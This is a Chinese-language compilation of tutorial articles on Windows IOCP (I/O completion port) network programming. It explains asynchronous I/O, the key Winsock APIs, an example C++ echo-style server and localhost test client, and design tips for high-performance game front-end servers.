由前文可知，IOCP 运用的是异步 I/O 通信机制，那么异步 I/O 与同步 I/O 最大的区别在哪呢？ 前置知识：在操作系统中，外部设备的 I/O 速度，与 CPU 相比，是有非常大的差距的。 异步与同步的本质，在于主线程与通信线程是否能够“并行”。 同步 I/O 机制，在发起 I/O 的时候，顾名思义，用户与设备的数据需要进行同步，将数据在内核缓冲区同步后，再经过拷贝返回到用户进程，此时会导致进程阻塞，影响通信效率。 ![同步 I/O 机制](07b49c319ed14a70a5a84f00cb2d82a3~tplv-k3u1fbpfcp-zoom-in-crop-mark 1512 0 0 0.webp) 而异步 I/O ，则不需要等待操作完成，当用户进程发送请求之后，便可进行其他的操作，当内核将数据准备好之后，会将数据从内核缓冲区拷贝到用户进程。此时内核发送消息通知 I/O 请求完成即可。 ![异步 I/O 机制](184d8777ebc34f89a438beac75b69237~tplv-k3u1fbpfcp-zoom-in-crop-mark 1512 0 0 0.webp) 由上文我们可知，异步与同步，同时具备在内核缓冲区拷贝到用户进程这个过程，而在等待外部 I/O 设备拷贝的时间里，异步可以执行其他的操作，而同步只能干等着。因此在高性能网络服务器中，使用异步通信机制，是必不可少的。这也是 IOCP 快的另一层“秘诀”。 因此我们可以稍微总结一下，IOCP 快的原因： 根据 CPU 内核数量创建工作线程，使用公共消息队列进行调度，保证 CPU 资源的合理利用； 使用公共消息队列，保证工作线程之间的负载均衡，防止 CPU 周期被浪费； 利用异步 I/O 通信机制，是主线程与网络线程”并行“。 ※3. 使用 IOCP 的基本流程 据上文分析之后，大家也基本上对 IOCP 的原理有了一个认识，那下一步，我们就稍微了解一下 IOCP 使用的基本流程。 与基础的 Socket 通信类似，IOCP 其实也有绑定端口，创建连接，接受数据等一系列操作。简单地，使用 IOCP 的基本流程如下： 初始化完成端口和工作线程 创建 Socket，并绑定到完成端口上，监听消息连接 接受并监听数据 关闭完成端口 一般地，我们创建CPU核心数*2的工作线程，使得在某个线程 Sleep() 或WSAWaitForMultipleEvents() 将线程挂起时（此时不占用CPU时间片），CPU的内核仍旧有线程在工作，减少线程调度的时间，保证程序的执行效率）。 而具体的 IOCP 执行，诸位可以由这张流程图，直观的看到： ![IOCP 执行流程图](5169c4e57e1449a8b751ef8867e1f21c~tplv-k3u1fbpfcp-zoom-in-crop-mark 1512 0 0 0.webp) ※4. 尾声 完成端口的理解，其实相对来说没那么复杂，主要是需要对其性能强劲的各个组成进行详细的了解和认识，只有逐步拆分逐步深入，才能更精确的了解到其性能强劲的原因。而在使用的过程中，只要遵循完成端口的基本流程，并将其加入项目逐步拓展即可。在众多优秀的网络库中，诸如 AISO 网络库，其底层实现其实也用到了 IOCP 完成端口，利用封装好的网络库，有时候也比使用底层库要来得更轻松易用。因此重点在如何理解其原理，从业务入手，简化开发流程与压力，这才是上上策。 ※IOCP详解[5] ※IOCP详解 IOCP（I/O Completion Port，I/O完成端口）是性能最好的一种I/O模型。它是应用程序使用线程池处理异步I/O请求的一种机制。在处理多个并发的异步I/O请求时，以往的模型都是在接收请求是创建一个线程来应答请求。这样就有很多的线程并行地运行在系统中。而这些线程都是可运行的，Windows内核花费大量的时间在进行线程的上下文切换，并没有多少时间花在线程运行上。再加上创建新线程的开销比较大，所以造成了效率的低下。 Windows Sockets应用程序在调用WSARecv()函数后立即返回,线程继续运行。当系统接收数据完成后，向完成端口发送通知包（这个过程对应用程序不可见）。 应用程序在发起接收数据操作后，在完成端口上等待操作结果。当接收到I/O操作完成的通知后，应用程序对数据进行处理。 完成端口其实就是上面两项的联合使用基础上进行了一定的改进。 一个完成端口其实就是一个通知队列，由操作系统把已经完成的重叠I/O请求的通知放入其中。当某项I/O操作一旦完成，某个可以对该操作结果进行处理的工作者线程就会收到一则通知。而套接字在被创建后，可以在任何时候与某个完成端口进行关联。 众所皆知，完成端口是在WINDOWS平台下效率最高，扩展性最好的IO模型，特别针对于WINSOCK的海量连接时，更能显示出其威力。其实建立一个完成端口的服务器也很简单，只要注意几个函数，了解一下关键的步骤也就行了。 分为以下几步来说明完成端口： 同步IO与异步IO 函数 常见问题以及解答 步骤 例程 ※0、同步IO与异步IO 同步I/O首先我们来看下同步I/O操作，同步I/O操作就是对于同一个I/O对象句柄在同一时刻只允许一个I/O操作，原理图如下： 由图可知，内核开始处理I/O操作到结束的时间段是T2~T3，这个时间段中用户线程一直处于等待状态，如果这个时间段比较短，则不会有什么问题，但是如果时间比较长，那么这段时间线程会一直处于挂起状态，这就会很严重影响效率，所以我们可以考虑在这段时间做些事情。 异步I/O操作则很好的解决了这个问题，它可以使得内核开始处理I/O操作到结束的这段时间，让用户线程可以去做其他事情，从而提高了使用效率。 由图可知，内核开始I/O操作到I/O结束这段时间，用户层可以做其他的操作，然后，当内核I/O结束的时候，可以让I/O对象或者时间对象通知用户层，而用户线程GetOverlappedResult来查看内核I/O的完成情况。 ※1、函数 我们在完成端口模型下会使用到的最重要的两个函数是： 1CreateIoCompletionPort、GetQueuedCompletionStatus CreateIoCompletionPort 的作用是创建一个完成端口和把一个IO句柄和完成端口关联起来： 123// 创建完成端口HANDLECompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0); 123// 把一个IO句柄和完成端口关联起来，这里的句柄是一个socket 句柄CreateIoCompletionPort((HANDLE)sClient,CompletionPort, (DWORD)PerHandleData, 0); 其中第一个参数是句柄，可以是文件句柄、SOCKET句柄。 第二个就是我们上面创建出来的完成端口，这里就把两个东西关联在一起了。 第三个参数很关键，叫做PerHandleData，就是对应于每个句柄的数据块。我们可以使用这个参数在后面取到与这个SOCKET对应的数据。 最后一个参数给0，意思就是根据CPU的个数，允许尽可能多的线程并发执行。 GetQueuedCompletionStatus的作用就是取得完成端口的结果： 123// 从完成端口中取得结果GetQueuedCompletionStatus(CompletionPort,&amp;BytesTransferred, (LPDWORD)&amp;PerHandleData,(LPOVERLAPPED*)&amp;PerIoData, INFINITE) 第一个参数是完成端口 第二个参数是表明这次的操作传递了多少个字节的数据 第三个参数是OUT类型的参数，就是前面CreateIoCompletionPort传进去的单句柄数据，这里就是前面的SOCKET句柄以及与之相对应的数据，这里操作系统给我们返回，让我们不用自己去做列表查询等操作了。 第四个参数就是进行IO操作的结果，是我们在投递WSARecv / WSASend 等操作时传递进去的，这里操作系统做好准备后，给我们返回了。非常省事！！ 个人感觉完成端口就是操作系统为我们包装了很多重叠IO的不爽的地方，让我们可以更方便的去使用，下篇我将会尝试去讲述完成端口的原理。 ※2、常见问题和解答 ※1）什么是单句柄数据(PerHandle)和单IO数据(PerIO) 单句柄数据就是和句柄对应的数据，像socket句柄，文件句柄这种东西。 单IO数据，就是对应于每次的IO操作的数据。例如每次的WSARecv/WSASend等等 其实我觉得PER是每次的意思，翻译成每个句柄数据和每次IO数据还比较清晰一点。 在完成端口中，单句柄数据直接通过GetQueuedCompletionStatus 返回，省去了我们自己做容器去管理。单IO数据也容许我们自己扩展OVERLAPPED结构，所以，在这里所有与应用逻辑有关的东西都可以在此扩展。 ※2）如何判断客户端的断开 我们要处理几种情况 a. 如果客户端调用了closesocket，我们就可以这样判断他的断开： 12345678if(0== GetQueuedCompletionStatus(CompletionPort, &amp;BytesTransferred, ...)&#123;&#125;if(BytesTransferred == 0)&#123; // 客户端断开，释放资源&#125; b. 如果是客户端直接退出，那就会出现64错误，指定的网络名不可再用。这种情况我们也要处理的： 1234567if(0== GetQueuedCompletionStatus(...))&#123; if( (GetLastError() == WAIT_TIMEOUT) ||(GetLastError() == ERROR_NETNAME_DELETED) ) &#123; // 客户端断开，释放资源 &#125;&#125; ※3）什么是IOCP? 我们已经提到IOCP 只不过是一个专门实现用来进行线程间的通信的技术，和信号量（semaphore）相似，因此IOCP并不是一个复杂的概念。一个IOCP 对象是与多个I/O对象关联的，这些对象支持挂起异步IO调用。直到一个挂起的异步IO调用结束为止，一个访问IOCP的线程都有可能被挂起。 完成端口的目标是使CPU保持在满负荷状态下工作。 ※4）为什么使用IOCP? 使用IOCP,我们可以克服”一个客户端一个线程”的问题。我们知道，这样做的话，如果软件不是运行在一个多核及其上性能就会急剧下降。线程是系统资源，他们既不是无限制的、也不是代价低廉的。 IOCP提供了一种只使用一些（I/O worker）线程去“相对公平地”完成多客户端的”输入输出”。线程会一直被挂起，而不会使用CPU时间片，直到有事情做完为止。 ※5）IOCP是如何工作的？ 当使用IOCP时，你必须处理三件事情：a)将一个Socket关联到完成端口;b)创建一个异步I/O调用; c)与线程进行同步。为了获得异步IO调用的结果，比如哪个客户端执行了调用，你必须传入两个参数：pCompletionKey参数和OVERLAPPED结构。 ※3、步骤 编写完成端口服务程序，无非就是以下几个步骤： 创建一个完成端口 根据CPU个数创建工作者线程，把完成端口传进去线程里 创建侦听SOCKET，把SOCKET和完成端口关联起来 创建PerIOData，向连接进来的SOCKET投递WSARecv操作 线程里所做的事情： GetQueuedCompletionStatus，在退出的时候就可以使用PostQueudCompletionStatus使线程退出; 取得数据并处理; ※4、例程 下面是服务端的例程，可以使用sunxin视频中中的客户端程序来测试服务端。稍微研究一下，也就会对完成端口模型有个大概的了解了。 实例结果服务器、客户端如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256/*完成端口服务器接收到客户端的信息，直接显示出来*/#include&quot;winerror.h&quot;#include&quot;Winsock2.h&quot;#pragma comment(lib, &quot;ws2_32&quot;)#include&quot;windows.h&quot;#include&lt;iostream&gt;using namespace std; /// 宏定义#define PORT 5050#define DATA_BUFSIZE 8192 #define OutErr(a) cout &lt;&lt; (a) &lt;&lt; endl \\ &lt;&lt; &quot;出错代码：&quot;&lt;&lt; WSAGetLastError() &lt;&lt; endl \\ &lt;&lt; &quot;出错文件：&quot;&lt;&lt; __FILE__ &lt;&lt; endl \\ &lt;&lt; &quot;出错行数：&quot;&lt;&lt; __LINE__ &lt;&lt; endl \\ #define OutMsg(a) cout &lt;&lt; (a) &lt;&lt; endl; /// 全局函数定义 /////////////////////////////////////////////////////////////////////////// 函数名 : InitWinsock// 功能描述 : 初始化WINSOCK// 返回值 : void/////////////////////////////////////////////////////////////////////////void InitWinsock()&#123; // 初始化WINSOCK WSADATA wsd; if( WSAStartup(MAKEWORD(2, 2), &amp;wsd) != 0) &#123; OutErr(&quot;WSAStartup()&quot;); &#125;&#125; /////////////////////////////////////////////////////////////////////////// 函数名 : BindServerOverlapped// 功能描述 : 绑定端口，并返回一个 Overlapped 的ListenSocket// 参数 : int nPort// 返回值 : SOCKET/////////////////////////////////////////////////////////////////////////SOCKET BindServerOverlapped(int nPort)&#123; // 创建socket SOCKET sServer = WSASocket(AF_INET,SOCK_STREAM, 0, NULL, 0, WSA_FLAG_OVERLAPPED); // 绑定端口 struct sockaddr_in servAddr; servAddr.sin_family = AF_INET; servAddr.sin_port = htons(nPort); servAddr.sin_addr.s_addr = htonl(INADDR_ANY); if(bind(sServer, (struct sockaddr*)&amp;servAddr, sizeof(servAddr)) &lt; 0) &#123; OutErr(&quot;bind Failed!&quot;); return NULL; &#125; // 设置监听队列为200 if(listen(sServer, 200) != 0) &#123; OutErr(&quot;listen Failed!&quot;); return NULL; &#125; return sServer;&#125; /// 结构体定义typedef struct&#123; OVERLAPPED Overlapped; WSABUF DataBuf; CHAR Buffer[DATA_BUFSIZE];&#125;PER_IO_OPERATION_DATA,* LPPER_IO_OPERATION_DATA; typedef struct&#123; SOCKET Socket;&#125;PER_HANDLE_DATA,* LPPER_HANDLE_DATA; DWORD WINAPI ProcessIO(LPVOID lpParam)&#123; HANDLE CompletionPort = (HANDLE)lpParam; DWORD BytesTransferred; LPPER_HANDLE_DATA PerHandleData; LPPER_IO_OPERATION_DATA PerIoData; while(true) &#123; if(0 == GetQueuedCompletionStatus(CompletionPort,&amp;BytesTransferred, (LPDWORD)&amp;PerHandleData,(LPOVERLAPPED*)&amp;PerIoData, INFINITE)) &#123; if( (GetLastError() ==WAIT_TIMEOUT) || (GetLastError() == ERROR_NETNAME_DELETED) ) &#123; cout &lt;&lt; &quot;closingsocket&quot; &lt;&lt; PerHandleData-&gt;Socket &lt;&lt; endl; closesocket(PerHandleData-&gt;Socket); delete PerIoData; delete PerHandleData; continue; &#125; else &#123; OutErr(&quot;GetQueuedCompletionStatus failed!&quot;); &#125; return 0; &#125; // 说明客户端已经退出 if(BytesTransferred == 0) &#123; cout &lt;&lt; &quot;closing socket&quot; &lt;&lt;PerHandleData-&gt;Socket &lt;&lt; endl; closesocket(PerHandleData-&gt;Socket); delete PerIoData; delete PerHandleData; continue; &#125; // 取得数据并处理 cout &lt;&lt; PerHandleData-&gt;Socket&lt;&lt; &quot;发送过来的消息：&quot; &lt;&lt; PerIoData-&gt;Buffer&lt;&lt; endl; // 继续向 socket 投递WSARecv操作 DWORD Flags = 0; DWORD dwRecv = 0; ZeroMemory(PerIoData,sizeof(PER_IO_OPERATION_DATA)); PerIoData-&gt;DataBuf.buf =PerIoData-&gt;Buffer; PerIoData-&gt;DataBuf.len = DATA_BUFSIZE; WSARecv(PerHandleData-&gt;Socket,&amp;PerIoData-&gt;DataBuf, 1, &amp;dwRecv, &amp;Flags,&amp;PerIoData-&gt;Overlapped, NULL); &#125; return 0;&#125; void main()&#123; InitWinsock(); HANDLE CompletionPort =CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0); //根据系统的CPU来创建工作者线程 SYSTEM_INFO SystemInfo; GetSystemInfo(&amp;SystemInfo); //线程数目=系统进程数目的两倍. for(int i = 0; i &lt;SystemInfo.dwNumberOfProcessors * 2; i++) &#123; HANDLE hProcessIO = CreateThread(NULL, 0,ProcessIO, CompletionPort, 0, NULL); if(hProcessIO) &#123; CloseHandle(hProcessIO); &#125; &#125; //创建侦听SOCKET SOCKET sListen = BindServerOverlapped(PORT); SOCKET sClient; LPPER_HANDLE_DATA PerHandleData; LPPER_IO_OPERATION_DATA PerIoData; while(true) &#123; // 等待客户端接入 //sClient = WSAAccept(sListen, NULL, NULL, NULL, 0); sClient = accept(sListen, 0, 0); cout &lt;&lt; &quot;Socket &quot; &lt;&lt; sClient &lt;&lt; &quot;连接进来&quot;&lt;&lt; endl; PerHandleData = new PER_HANDLE_DATA(); PerHandleData-&gt;Socket = sClient; // 将接入的客户端和完成端口联系起来 CreateIoCompletionPort((HANDLE)sClient, CompletionPort,(DWORD)PerHandleData, 0); // 建立一个Overlapped，并使用这个Overlapped结构对socket投递操作 PerIoData = new PER_IO_OPERATION_DATA(); ZeroMemory(PerIoData, sizeof(PER_IO_OPERATION_DATA)); PerIoData-&gt;DataBuf.buf = PerIoData-&gt;Buffer; PerIoData-&gt;DataBuf.len = DATA_BUFSIZE; // 投递一个WSARecv操作 DWORD Flags = 0; DWORD dwRecv = 0; WSARecv(sClient, &amp;PerIoData-&gt;DataBuf, 1, &amp;dwRecv, &amp;Flags,&amp;PerIoData-&gt;Overlapped, NULL); &#125; DWORD dwByteTrans; //将一个已经完成的IO通知添加到IO完成端口的队列中. //提供了与线程池中的所有线程通信的方式. PostQueuedCompletionStatus(CompletionPort,dwByteTrans, 0, 0); //IO操作完成时接收的字节数. closesocket(sListen);&#125;/*--------------------------------------------**---------客户端例程序--------------------------------------------------------------------*/#include&lt;stdio.h&gt;#include&lt;Winsock2.h&gt;#define MAXCNT 30000void main()&#123; WORD wVersionRequested; WSADATA wsaData; int err; wVersionRequested = MAKEWORD( 2, 2); err = WSAStartup( wVersionRequested,&amp;wsaData );//WSAStartup()加载套接字库 if ( err != 0 ) &#123; return; &#125; if ( LOBYTE( wsaData.wVersion ) != 2 || HIBYTE( wsaData.wVersion ) != 2 )&#123; WSACleanup( ); return; &#125; static int nCnt = 0; char sendBuf[2000];// char recvBuf[100]; while(nCnt &lt; MAXCNT) &#123; SOCKETsockClient=socket(AF_INET,SOCK_STREAM,0); SOCKADDR_IN addrSrv; addrSrv.sin_addr.S_un.S_addr=inet_addr(&quot;127.0.0.1&quot;);//本地回路地址127，用于一台机器上测试的IP addrSrv.sin_family=AF_INET; addrSrv.sin_port=htons(5050);//和服务器端的端口号保持一致 connect(sockClient,(SOCKADDR*)&amp;addrSrv,sizeof(SOCKADDR));//连接服务器端（套接字，地址转换，长度） sprintf(sendBuf,&quot;This is TestNo : %d\\n&quot;,++nCnt); send(sockClient,sendBuf,strlen(sendBuf)+1,0);//向服务器端发送数据，&quot;+1&quot;是为了给&#x27;\\0&#x27;留空间 printf(&quot;send:%s&quot;,sendBuf); // memset(recvBuf,0,100);// recv(sockClient,recvBuf,100,0);//接收数据// printf(&quot;%s\\n&quot;,recvBuf);//打印 closesocket(sockClient);//关闭套接字，释放为这个套接字分配的资源 Sleep(1); &#125; WSACleanup();//终止对这个套接字库的使用 ※IOCP编程小结（中）[6] 简介： 上一篇主要谈了一些基本理念，本篇将谈谈我个人总结的一些IOCP编程技巧。 网络游戏前端服务器的需求和设计 首先介绍一下这个服务器的技术背景。在分布式网络游戏服务器中，前端连接服务器是一种很常见的设计。 上一篇主要谈了一些基本理念，本篇将谈谈我个人总结的一些IOCP编程技巧。 ※网络游戏前端服务器的需求和设计 首先介绍一下这个服务器的技术背景。在分布式网络游戏服务器中，前端连接服务器是一种很常见的设计。他的职责主要有： 1. 为客户端和后端的游戏逻辑服务器提供一个软件路由 —— 客户端一旦和前端服务器建立TCP连接以后就可以通过这个连接和后端的游戏服务器进行通讯，而不再需要和后端的服务器再建立新的连接。 2. 承担来自客户端的IO压力 —— 一组典型的网络游戏服务器需要服务少则几千多则上万（休闲游戏则可以多达几十万）的游戏客户端，这个IO处理的负载相当可观，由一组前端服务器承载这个IO负担可以有效的减轻后端服务器的IO负担，并且让后端服务器也只需要关心游戏逻辑的实现，有效的实现IO和业务逻辑的解耦。 架构如图： 对于网络游戏来说，客户端与服务器之间需要进行频繁的通讯，但是每个数据包的尺寸基本都很小，典型的大小为几个字节到几十个字节不等，同时用户上行的数据量要比下行数据量小的多。不同的游戏类型对延迟的要求不太一样，FPS类的游戏希望延迟要小于50ms，MMO类型的100～400ms，一些休闲类的棋牌游戏1000ms左右的延迟也是可以接受的。因此，网络游戏的通讯是以优化延迟的同时又必须兼顾小包的合并以防止网络拥塞，哪个因素为主则需要根据具体的游戏类型来决定。 技术背景就介绍这些，后面介绍的IOCP连接服务器就是以这些需求为设计目标的。 ※对IOCP服务器框架的考察 在动手实现这个连接服务器之前，我首先考察了一些现有的开源IOCP服务器框架库，老牌的如ACE，整个库太多庞大臃肿，代码也显老态，无好感。boost.asio据说是个不错的网络框架也支持IOCP，我编译运行了一下他的例子，然后尝试着阅读了一下asio的代码，感觉非常恐怖，完全弄不清楚内部是怎么实现的，于是放弃。asio秉承了boost一贯的变态作风，将C++的语言技巧凌驾于设计和代码可读性之上，这是我非常反对的。其他一些不入流的IOCP框架也看了一些，真是写的五花八门什么样的实现都有，总体感觉下来IOCP确实不太容易把握和抽象，所以才导致五花八门的实现。最后，还是决定自己重新造轮子。 ※服务框架的抽象 任何的服务器框架从本质上说都是封装一个事件（Event）消息循环。而应用层只要向框架注册事件处理函数，响应事件并进行处理就可以了。一般的同步IO处理框架是先收到IO事件然后再进行IO操作，这类的事件处理框架我们称之为Reactor。而IOCP的特殊之处在于用户是先发起IO操作，然后接收IO完成的事件，次序和Reactor是相反的，这类的事件处理框架我们称之为Proactor。从词根Re和Pro上，我们也可以容易的理解这两者的差别。除了网络IO事件之外，服务器应该还可以响应Timer事件及用户自定义事件。框架做的事情就是把这些事件统统放到一个消息队列里，然后从队列中取出事件，调用相应的事件处理函数，如此循环往复。 IOCP为我们提供了一个系统级的消息队列（称之为完成队列），事件循环就是围绕着这个完成队列展开的。在发起IO操作后系统会进行异步处理（如果能立刻处理的话也会直接处理掉），当操作完成后自动向这个队列投递一条消息，不管是直接处理还是异步处理，最后总会投递完成消息。 顺便提一下：这里存在一个性能优化的机会：当IO操作能够立刻完成的话，如果让系统不要再投递完成消息，那么就可以减少一次系统调用（这至少可以节省几个微秒的开销），做法是调用SetFileCompletionNotificationModes(handle, FILE_SKIP_COMPLETION_PORT_ON_SUCCESS)，具体的可以查阅MSDN。 对于用户自定义事件可以使用Post来投递。对于Timer事件，我的做法则是实现一个TimerHeap的数据结构，然后在消息循环中定期检查这个TimerHeap，对超时的Timer事件进行调度。 IOCP完成队列返回的消息是一个OVERLAPPED结构体和一个ULONG_PTR complete_key。complete_key是在用户将Socket handle关联到IOCP的时候绑定的，其实用性不是很大，而OVERLAPPED结构体则是在用户发起IO操作的时候设置的，并且OVERLAPPED结构可以由用户通过继承的方式来扩展，因此如何用好OVERLAPPED结构在螺丝壳里做道场，就成了封装好IOCP的关键。 这里，我使用了一个C++模板技巧来扩展OVERLAPPED结构，先看代码： 123456789101112131415161718192021222324struct IOCPHandler &#123; virtual void Complete(ULONG\\_PTR key, DWORD size) = 0; virtual void OnError(ULONG\\_PTR key, DWORD error)&#123;&#125; virtual void Destroy() = 0; &#125;;struct Overlapped : public OVERLAPPED &#123; IOCPHandler\\* handler; &#125;;template&lt;class T&gt; struct OverlappedWrapper : T &#123; Overlapped overlap; OverlappedWrapper()&#123; ZeroMemory(&amp;overlap, sizeof(overlap)); overlap.handler = this; &#125; operator OVERLAPPED\\*()&#123;return &amp;overlap;&#125; &#125;; IOCPHandler是用户对象的接口，用户扩展这个接口来实现IO完成事件的处理。然后通过一个OverlappedWrapper&lt;T&gt;的模板类将用户对象和OVERLAPPED结构封装成一个对象，T类型就是用户扩展的对象，由于用户对象位于OVERLAPPED结构体的前面，因此我们会将OVERLAPPED的指针传递给IO操作的API，同时我们在OVERLAPPED结构的后面还放置了一个用户对象的指针，当GetQueuedCompletionStatus接收到OVERLAPPED结构体指针后，我们通过这个指针就可以找到用户对象的位置了，然后调用虚函数Complete或者OnError就可以了。 图解一下对象结构： 在事件循环里的处理方法 ： 123456789101112131415161718192021DWORD size; ULONG\\_PTR key; Overlapped\\* overlap; BOOL ret = ::GetQueuedCompletionStatus(\\_iocp, &amp;size, &amp;key, (LPOVERLAPPED\\*)&amp;overlap, dt); if(ret)&#123; if(overlap == 0)&#123; OnExit(); break; &#125; overlap-&gt;handler-&gt;Complete(key, size); overlap-&gt;handler-&gt;Destroy(); &#125; else &#123; DWORD err = GetLastError(); if(err == WAIT\\_TIMEOUT) UpdateTimer(); else if(overlap) &#123; overlap-&gt;handler-&gt;OnError(key, err); overlap-&gt;handler-&gt;Destroy(); &#125; &#125; 在这里利用我们利用了C++的多态来扩展OVERLAPPED结构，在框架层完全不用关心接收到的是什么IO事件，只需要应用层自己关心就够了，同时也避免了使用丑陋的难于扩展的switch…case结构。 对于异步操作来说，最让人痛苦的事情就是需要把原本顺序逻辑的代码强行拆分成多块来回调，这使得代码中原本蕴含的顺序逻辑被打散，并且在各个代码块里的上下文变量无法共享，必须另外生成一个对象放置这些上下文变量，而这又引发一个对象生存期管理的问题，对于没有GC的C来说尤其痛苦。解决异步逻辑的痛苦之道目前有两种方案：一种是用coroutine（协作式线程）将异步逻辑变成同步逻辑，在Windows上可以使用Fiber来实现coroutine；另一种方案是使用闭包，闭包原本是函数式语言的特性，在C里并没有，不过幸运的是我们可以通过一个稍微麻烦一点的方法来模拟闭包行为。coroutine在解决异步逻辑方面是最拿手的，特别是一个函数里需要依次进行多个异步操作的时候尤其强大（在这种情况下闭包也相形见拙），但是另一方面coroutine的实现比较复杂，线程的手工调度常常把人绕晕，对于IOCP这种异步操作比较有限的场景有点杀鸡用牛刀的感觉。因此最后我还是决定使用C++来模拟闭包行为。 这里演示一个典型的异步IO用法，看代码：一个异步发送的例子： 这个例子中，我们在函数内部定义了一个SendHandler对象，模拟出了一个闭包的行为，我们可以把需要用到的上下文变量放置在SendHandler内，当下次回调的时候就可以访问到这些变量了。本例中，我们在SendHandler里记了一个cookie，其作用是当异步操作返回时，可能这个Client对象已经被回收了，这个时候如果再调用EndSend必然会导致错误的结果，因此我们通过cookie来判断这个Client对象是否是那个异步操作发起时的Client对象。 使用闭包虽然没有coroutine那样漂亮的顺序逻辑结构，但是也足够方便你把各个异步回调代码串起来，同时在闭包内共享需要用到的上下文变量。另外，最新版的C标准对闭包有了原生的支持，实现起来会更方便一些，如果你的编译器足够新的话可以尝试使用新的C特性。 ※IO工作线程 单线程vs多线程 在绝大多数讲解IOCP的文章中都会建议使用多个工作线程来处理IO事件，并且把工作线程数设置为CPU核心数的2倍。根据我的印象，这种说法的出处来自于微软早期的官方文档。不过，在我看来这完全是一种误导。IOCP的设计初衷就是用尽可能少的线程来处理IO事件，因此使用单线程处理本身是没有问题的，这可以使实现简化很多。反之，用多线程来处理的话，必须处处小心线程安全的问题，同时也会涉及到加锁的问题，而不恰当的加锁反而会使性能急剧下降，甚至不如单线程程序。有些同学可能会认为使用多线程可以发挥多核CPU的优势，但是目前CPU的速度足够用来处理IO事件，一般现代CPU的单个核心要处理一块千兆网卡的IO事件是绰绰有余的，最多的可以同时处理2块网卡的IO事件，瓶颈往往在网卡上。如果是想通过多块网卡提升IO吞吐量的话，我的建议是使用多进程来横向扩展，多进程不但可以在单台物理服务器上进行扩展，并且还可以扩展到多台物理服务器上，其伸缩性要比多线程更强。 当时微软提出的这个建议我想主要是考虑到在IO线程中除了IO处理之外还有业务逻辑需要处理，使用多线程可以解决业务逻辑阻塞的问题。但是将业务逻辑放在IO线程里处理本身不是一种好的设计模式，这没有很好的做到IO和业务解耦，同时也限制了服务器的伸缩性。良好的设计应该将IO和业务解耦，使用多进程或者多线程将业务逻辑放在另外的进程或者线程里进行处理，而IO线程只需要负责最简单的IO处理，并将收到的消息转发到业务逻辑的进程或者线程里处理就可以了。我的前端连接服务器也是遵循了这种设计方法。 ※关闭发送缓冲区实现自己的nagle算法 IOCP最大的优势就是他的灵活性，关闭socket上的发送缓冲区就是一例。很多人认为关闭发送缓冲的价值是可以减少一次内存拷贝的开销，在我看来这只是捡了一粒芝麻而已。主流的千兆网卡其最大数据吞吐量不过区区120MB/s，而内存数据拷贝的吞吐量是10GB/s以上，多一次120MB/s数据拷贝，仅消耗1%的内存带宽，意义非常有限。 在普通的Socket编程中，我们只有打开nagle算法或者不打开的选择，策略的选择和参数的微调是没有办法做到的。而当我们关闭发送缓冲之后，每次Send操作一定会等到数据发送到对方的协议栈里并且收到ACK确认才会返回完成消息，这就给了我们一个实现自定义的nagle算法的机会。对于网络游戏这种需要频繁发送小数据包，打开nagle算法可以有效的合并发送小数据包以降低网络IO负担，但另一方面也加大了延迟，对游戏性造成不利影响。有了关闭发送缓冲的特性之后，我们就可以自行决定nagle算法的实现细节，在上一个send操作没有结束之前，我们可以决定是立刻发送新的数据（以降低延迟），还是累积数据等待上一个send结束或者超时后再发送。更复杂一点的策略是可以让服务器容忍多个未结束的send操作，当超出一个阈值后再累积数据，使得在IO吞吐量和延迟上达到一个合理的平衡。 ※发送缓冲的分配策略 前面提到了关闭socket的发送缓冲，那么就涉及到我们自己如何来分配发送缓冲的问题。 一种策略是给每个Socket分配一个固定大小的环形缓冲区。这会存在一个问题：当缓冲区内累积的未发送数据加上新发送的数据大小超出了缓冲区的大小，这个时候就会碰上麻烦，要么阻塞以等待前面的数据发送完毕（但是IO线程不可以阻塞），要么干脆直接把Socket关闭，一个妥协的办法是尽可能把发送缓冲区设置的大一些，但这又会白白浪费很多内存。 另一种策略是让所有的客户端socket共享一个非常大的环形缓冲区，假设我们保留一个1G的内存区域给这个环形缓冲区，每次需要向客户端发送数据时就从这个环形缓冲区分配内存，当缓冲区分配到底了再绕到开头重新分配。由于这个缓冲区非常大，1G的内存对千兆网卡来说至少需要花费10s才能发送完，并且在实际应用中这个时间会远超10s。因此当新的数据从头开始分配的时候，老的数据早已经发送掉了，不用担心将老的数据覆盖，即使碰到网络阻塞，一个数据包超过10s还未发送掉的话，我们也可以通过超时判断主动关闭这个socket。 ※socket池和对象池的分配策略 允许socket重用是IOCP另一个优势，我们可以在server启动时，根据我们对最大服务人数的预计，将所有的socket资源都分配好。一般来说每个socket必需对应一个client对象，用来记录一些客户端的信息，这个对象池也可以和socket绑定并预先分配好。在服务运行前将所有的大块对象的内存资源都预先分配好，用一个FreeList来做对象池的分配，在客户端下线之后再将资源回收到池中。这样就可以避免在服务运行过程中动态的分配大的对象，而一些需要临时分配的小对象（例如OVERLAPPED结构），我们可以使用诸如tcmalloc之类的通用内存分配器来做，tcmalloc内部使用小对象池算法，其分配性能和稳定性非常好，并且他的接口是非侵入式的，我们仍然可以在代码里保留malloc/free及new/delete。很多服务在长期运行之后出现运行效率降低，内存占用过大等问题，都跟频繁的分配和释放内存导致出现大量的内存碎片有关。所以做好服务器的内存分配管理是至关重要的一环。 ※采用完成端口（IOCP）实现高性能网络服务器（Windows c++版）[7] ※前言 TCP\\IP已成为业界通讯标准。现在越来越多的程序需要联网。网络系统分为服务端和客户端，也就是c\\s模式(client \\ server)。client一般有一个或少数几个连接；server则需要处理大量连接。大部分情况下，只有服务端才特别考虑性能问题。本文主要介绍服务端处理方法，当然也可以用于客户端。 我也发表过c#版网络库。其实，我最早是从事c开发，多年前就实现了对完成端口的封装。最近又把以前的代码整理一下，做了测试，也和c#版网络库做了粗略对比。总体上，还是c性能要好一些。c#网络库见文章《一个高性能异步socket封装库的实现思路》。 Windows平台下处理socket通讯有多种方式；大体可以分为阻塞模式和非阻塞模式。阻塞模式下send和recv都是阻塞的。简单讲一下这两种模式处理思路。 